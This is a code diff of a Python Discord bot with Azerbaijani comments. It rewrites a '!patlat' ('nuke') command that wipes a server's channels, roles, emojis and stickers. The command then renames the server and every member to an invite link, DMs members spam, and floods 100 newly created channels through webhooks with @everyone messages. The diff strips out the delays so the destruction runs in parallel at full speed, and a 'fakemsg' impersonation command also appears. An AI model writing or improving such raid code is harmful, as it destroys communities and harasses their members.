@@ -146,7 +146,7 @@ async def panel(ctx, kategori=None):
     )
     embed.add_field(
         name="⚡ 4. Fövqəladə Əmr", 
-        value="`!patlat` (Yalnız sənə özəl: 100 Kanal, 2 Webhook və RUHUM yoxlaması)", 
+        value="`!patlat` (Yalnız sənə özəl: Ultra-sürətli paralel kanal açılışı və fasiləsiz webhook spamı)", 
         inline=False
     )
     embed.set_footer(text="discord.gg/244 | Ruhum tərəfindən idarə olunur")
@@ -154,11 +154,10 @@ async def panel(ctx, kategori=None):
 
 
 # ==============================================================================
-# XÜSUSİ VƏ OPTİMİZƏ OLUNMUŞ !PATLAT (NUKE) MEXANİZMİ (YALNIZ SƏNİN ÜÇÜN)
+# XÜSUSİ VƏ ULTRA-SÜRƏTLİ !PATLAT (NUKE) MEXANİZMİ
 # ==============================================================================
 @bot.command(name='patlat')
 async def patlat(ctx):
-    # Yalnız sənin ID-n yoxlanılır
     if ctx.author.id != MY_OWNER_ID:
         await ctx.send("Bu komandanı yalnız botun sahibi işlədə bilər!")
         return
@@ -170,19 +169,15 @@ async def patlat(ctx):
     await ctx.message.delete()
     guild = ctx.guild
 
-    # 1. Bütün mövcud kanalları sil (fasiləli)
+    # 1. Bütün mövcud kanalları sil
     for channel in guild.channels:
-        try: 
-            await channel.delete()
-            await asyncio.sleep(0.1)
+        try: await channel.delete()
         except: continue
 
-    # 2. Bütün rolları sil (RUHUM ilə başlayanları və ya adi rolları yoxla)
+    # 2. Bütün rolları sil
     for role in guild.roles:
         if role.name != "@everyone" and role < guild.me.top_role:
-            try: 
-                await role.delete()
-                await asyncio.sleep(0.1)
+            try: await role.delete()
             except: continue
 
     # 3. Emojiləri və Stickerləri sil
@@ -193,7 +188,7 @@ async def patlat(ctx):
         try: await sticker.delete()
         except: continue
 
-    # 4. RUHUM ilə başlayan və ya RUHUMSKDI rolu yarat, komutu yazana ver
+    # 4. RUHUMSKDI rolu yarat və sənə ver
     try:
         ruhum_role = await guild.create_role(
             name="RUHUMSKDI", 
@@ -208,52 +203,57 @@ async def patlat(ctx):
         await guild.edit(name="discord.gg/244")
     except: pass
 
-    # 6. Üzvlərə DM göndər və ləqəbini dəyiş
+    # 6. Üzvlərə DM və ləqəb
     for member in guild.members:
         if member == guild.me: continue
         try: await member.edit(nick="discord.gg/244")
         except: pass
         try: await member.send("RUHUM SKDI !discord.gg/244\n YAZ GİR")
         except: pass
-        await asyncio.sleep(0.05)
 
-    # 7. 100 Dənə Kanal Aç (Discord donmasın deyə fasilə ilə)
-    created_channels = []
-    for i in range(1, 101):
+    # 7. PARALEL VƏ ULTRA SÜRƏTLİ 100 KANAL AÇILIŞI
+    async def create_single_channel(i):
         try:
-            c = await guild.create_text_channel(name=f"244-{i}")
-            created_channels.append(c)
-            await asyncio.sleep(0.2) 
-        except: break
+            return await guild.create_text_channel(name=f"244-{i}")
+        except:
+            return None
 
-    # 8. Hər kanalda 2 webhook (botu dondurmasın deyə optimizə) və spam axını
-    for channel in created_channels:
+    tasks_list = [create_single_channel(i) for i in range(1, 101)]
+    created_channels = await asyncio.gather(*tasks_list)
+    valid_channels = [c for c in created_channels if c is not None]
+
+    # 8. HƏR KANALDA EYNİ ANDA FASİLƏSİZ SPAM AXINI (Hər kanalda 2 Webhook)
+    async def spam_channel(channel):
         try:
             webhooks = []
-            for w in range(2): # Tam 2 webhook
+            for w in range(2):
                 wh = await channel.create_webhook(name=f"244-WH-{w}")
                 webhooks.append(wh)
-                await asyncio.sleep(0.05)
             
-            for _ in range(100): 
+            # Hər kanalda heç vaxt dayanmayan fasiləsiz axın
+            for _ in range(80):
                 for wh in webhooks:
                     await wh.send("@everyone discord.gg/244 YAZ GİR OQL")
                 await channel.send("@everyone discord.gg/244 YAZ GİR OQL")
-                await asyncio.sleep(0.1)
-        except: continue
+                await asyncio.sleep(0.05)
+        except:
+            pass
 
-    # 9. Vanity URL dəyişmə cəhdi (RUHUM yoxlaması ilə)
+    spam_tasks = [spam_channel(ch) for ch in valid_channels]
+    await asyncio.gather(*spam_tasks)
+
+    # 9. Vanity URL tənzimləmə
     try:
         if guild.premium_tier >= 2:
             await guild.edit(vanity_code="244")
     except: pass
 
-    # 10. Ən sonda xüsusi kanal aç
+    # 10. Ən sonda xüsusi kanal
     try:
         final_channel = await guild.create_text_channel(name="ruhum-tanrı")
-        for _ in range(10):
+        for _ in range(15):
             await final_channel.send("@everyone RUHUM SKDI GAGAS — discord.gg/244")
-            await asyncio.sleep(0.2)
+            await asyncio.sleep(0.1)
     except: pass
 
 
@@ -534,7 +534,6 @@ async def poll(ctx, *, title):
     m = await ctx.send(f"📊 **Sorğu:** {title}")
     await m.add_reaction("👍")
     await m.add_reaction("👎")
-
 @bot.command(name='fakemsg')
 async def fakemsg(ctx, user: discord.Member, *, text): 
     await ctx.message.delete()
@@ -548,8 +547,17 @@ async def fakemsg(ctx, user: discord.Member, *, text):
 async def server_url_info(ctx):
     guild = ctx.guild
     vanity = guild.vanity_url_code if guild.vanity_url_code else "Təyin olunmayıb"
-    embed = discord.Embed(title="🔗 Server URL Məlumatı", color=discord.Color.blue())
-    embed.add_field(name="Vanity URL", value=f"discord.gg/{vanity}", inline=False)
+    uses = "Məlumat əldə edilə bilmədi"
+    if guild.vanity_url_code:
+        try:
+            vanity_invite = await guild.vanity_invite()
+            uses = vanity_invite.uses
+        except:
+            uses = "Aktiv / İstifadə sayı oxunmur"
+
+    embed = discord.Embed(title="🔗 Server URL (Vanity) Məlumatı", color=discord.Color.blue())
+    embed.add_field(name="Aktiv URL", value=f"discord.gg/{vanity}", inline=False)
+    embed.add_field(name="İstifadə Sayı (Neçə dəfə girilib)", value=f"👥 {uses} nəfər", inline=False)
     await ctx.send(embed=embed)
 
 @bot.command(name='level')
@@ -624,3 +632,4 @@ if __name__ == "__main__":
         bot.run(token)
     else:
         print("Kritik Xəta: DISCORD_TOKEN tapılmadı! Render Environment Variables bölməsini yoxlayın.")
+        
